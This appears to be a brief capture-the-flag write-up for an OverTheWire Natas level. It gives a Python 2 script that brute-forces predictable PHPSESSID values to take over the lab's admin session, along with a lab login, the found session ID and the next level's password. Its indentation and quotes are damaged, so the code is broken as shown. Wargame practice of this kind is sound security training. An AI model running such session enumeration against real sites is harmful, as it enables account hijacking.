# natas20

```python
import httplib,sys
from base64 import b64encode
from urllib import urlencode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs”).decode(“ascii”)
body=urlencode({‘username’ : ‘admin’ , ‘password’ : ‘aaa’ }) # username must be admin: it will affect how PHPSESSID is generated; password could be any string
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas19.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’ ,body=body,headers=headers)
response = httpClient.getresponse()
responseData = response.read()
#print responseData
if ‘regular’ in responseData:
print ‘regular ‘+str(sessid)
else:
print responseData
sys.exit()
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck():
for i in range(0,1000):
a = i/100
b = i/10-a*10
c = i%10
sessid=”
if not a==0:
sessid+=’3’+str(a)
if not b==0:
sessid+=’3’+str(b)
if not c==0:
sessid+=’3’+str(c)
sessid+=’2d61646d696e’
check(sessid)

autocheck()
```

The admin sessid is at 38392d61646d696e (089)
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF